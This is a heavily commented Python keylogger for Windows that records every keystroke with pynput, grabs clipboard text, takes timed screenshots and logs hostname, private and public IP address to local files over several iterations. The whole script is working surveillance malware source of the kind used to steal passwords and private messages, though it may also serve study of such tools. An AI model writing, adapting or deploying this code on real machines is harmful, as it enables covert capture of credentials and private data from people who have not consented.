# Importing necessary libraries for various functionalities

# socket: Provides low-level networking interfaces, used to retrieve machine's hostname and local IP address.
import socket

# platform: Used to access various platform-specific information such as processor type and system version.
import platform

# win32clipboard: Used to interact with the clipboard in Windows, specifically to get clipboard data (text).
import win32clipboard

# time: Provides various time-related functions. We use it to manage iteration timing and track current time.
import time

# os: Provides a way of interacting with the operating system, such as creating directories, working with paths, etc.
import os

# pynput.keyboard: A library for listening to keyboard input. The 'Key' class represents special keys (e.g., shift, ctrl),
# and the 'Listener' class allows us to listen for key press/release events.
from pynput.keyboard import Key, Listener

# getpass: A library to safely input passwords (e.g., for logging in), though not used in this script. 
import getpass

# requests: A simple HTTP library for making requests. Here, it's used to fetch the public IP address via an API (ipify).
from requests import get

# multiprocessing: Provides facilities for concurrent execution. The 'Process' and 'freeze_support' functions are for handling
# multiple processes, though not used in the current script.
from multiprocessing import Process, freeze_support

# PIL.ImageGrab: Part of the Python Imaging Library (PIL) used for capturing screenshots. 'ImageGrab.grab()' captures the screen.
from PIL import ImageGrab

# datetime: A module for manipulating dates and times. Here, we use 'datetime.now()' to create human-readable filenames 
# with timestamps (e.g., 2024-11-18_14-30-45).
from datetime import datetime

# Define log file names where the data will be stored
clipboardinfo = "clipboard.txt"  # File to store clipboard data
keystrokelog = "logging.txt"  # File to store captured keystrokes
sysinfo = "sysinfo.txt"  # File to store system information

# Initialize counters for iterations
iterations = 0  # Initialize the number of iterations
iterations_end = 5  # Number of iterations before stopping the script
currentTime = time.time()  # Store the current time at the start
time_of_each_iteration = 5  # Time (in seconds) to wait between each iteration
stopTime = time.time() + time_of_each_iteration  # Calculate the end time for this iteration

# Function to retrieve and log system information (hostname, IP address, etc.)
def computerinfo():
    with open(sysinfo, 'a') as f1:
        # Get the local machine's hostname and private IP address
        hostname = socket.gethostname()  # Get the machine's hostname
        IPAddress = socket.gethostbyname(hostname)  # Get the local IP address

        try:
            # Try to get the public IP address using an external API
            public_IP = get("https://api.ipify.org").text  # Get public IP from ipify API
            f1.write("Public IP Address: " + public_IP)  # Write public IP to log

        except Exception:
            # If an error occurs while fetching public IP, log an error message
            f1.write("Couldn't get Public IP Address")

        # Log additional system information (processor, system, machine type, etc.)
        f1.write("\n SYSTEM INFORMATION \n")
        f1.write("Processor: " + platform.processor() + '\n')  # Processor type
        f1.write("System: " + platform.system() + " " + platform.version() + '\n')  # System type and version
        f1.write("Machine: " + platform.machine() + '\n')  # Machine architecture (e.g., x86_64)
        f1.write("Hostname: " + hostname + '\n')  # Hostname of the machine
        f1.write("Private IP Address: " + IPAddress + '\n')  # Local IP address

# Call the computerinfo function to log system details
computerinfo()

# Function to get clipboard content and log it to a file
def clipboardcontent():
    with open(clipboardinfo, 'a') as f2:
        try:
            # Attempt to open the clipboard and retrieve its data
            win32clipboard.OpenClipboard()  # Open the clipboard
            data = win32clipboard.GetClipboardData()  # Get clipboard content (text)
            win32clipboard.CloseClipboard()  # Close the clipboard after reading

            # Write the clipboard data to the log file
            f2.write("\nClipboard data: \n" + data)

        except TypeError:
            # If clipboard data is not text or empty, log this information
            f2.write("Clipboard data is not text or empty.\n")
        except Exception as e:
            # If any error occurs while accessing the clipboard, log the error
            f2.write(f"Clipboard cannot be copied. Error: {str(e)}\n")

# Function to handle key press events
def when_pressed(key):
    global keys, count, currentTime

    # Print the key pressed (for debugging purposes)
    print(key)

    # Add the key to the keys list for logging
    keys.append(key)

    # Increment the count of keys pressed in the current iteration
    count += 1

    # Update the timestamp for this action
    currentTime = time.time()

    # If 10 keys are pressed, process them and reset the count
    if count >= 10:
        count = 0  # Reset the key press count
        writing(keys)  # Call the function to write the pressed keys to the file
        keys = []  # Reset the list of keys

# Function to write the captured keys to a file
def writing(key):
    with open(keystrokelog, 'a') as f:
        # Write the iteration timestamp and key actions to the log file
        f.write(f"\n\n--- Iteration {iterations + 1} started at: {time.ctime(currentTime)} ---\n")

        # Iterate over the list of keys and write their string representations to the file
        for key in keys:
            # Handle different key types and write appropriate representations to the file
            if key == Key.space:
                f.write(' ')  # Spacebar pressed
            elif key == Key.enter:
                f.write('\n')  # Enter key pressed
            elif key == Key.backspace:
                f.write(' [BACKSPACE] ')  # Backspace key pressed
            elif key == Key.shift:
                f.write(' [SHIFT] ')  # Shift key pressed
            elif key == Key.ctrl:
                f.write(' [CTRL] ')  # Control key pressed
            elif key == Key.alt:
                f.write(' [ALT] ')  # Alt key pressed
            elif key == Key.cmd:
                f.write(' [COMMAND] ')  # Command key pressed (Windows/Linux/Mac)
            elif key == Key.tab:
                f.write(' [TAB] ')  # Tab key pressed
            else:
                # Write the key as a string without single quotes (e.g., a, b, c, etc.)
                f.write(str(key).replace("'", ""))

# Function to stop the keystroke listener when conditions are met (Esc key or timeout)
def when_released(key):
    global currentTime, stopTime

    # If the Escape key is pressed, stop the listener
    if key == Key.esc:
        return False
    # If the time for the iteration has passed, stop the listener
    if currentTime > stopTime:
        return False
    return True

# Function to take a screenshot and save it as a PNG file with a human-readable filename
def screenshot():
    global iterations
    # Create a human-readable timestamp for the screenshot filename
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Example format: 2024-11-18_14-30-45
    # Capture the entire screen and save it with a filename that includes the iteration number and timestamp
    image = ImageGrab.grab()
    image.save(f"screenshot_{iterations}_{timestamp}.png")

# Loop for capturing keystrokes and other data until the conditions are met
while iterations < iterations_end:

    keys = []  # List to store the keys pressed
    count = 0  # Count of keys pressed in each iteration

    # Start the listener for key press and release events
    with Listener(on_press=when_pressed, on_release=when_released) as l:
        l.join()  # Wait for the listener to finish

    # If the iteration time has passed, take a screenshot and update data
    if currentTime > stopTime:
        with open(keystrokelog, 'a') as f3:
            f3.write(" ")  # Adding a blank line between iterations in the log file

        screenshot()  # Take a screenshot and save it with a human-readable filename
        clipboardcontent()  # Capture clipboard content and log it

        iterations += 1  # Increment the iteration counter

        # Update the current time and reset the stop time for the next iteration
        currentTime = time.time()  # Reset current time
        stopTime = time.time() + time_of_each_iteration  # Set new stop time for the next iteration
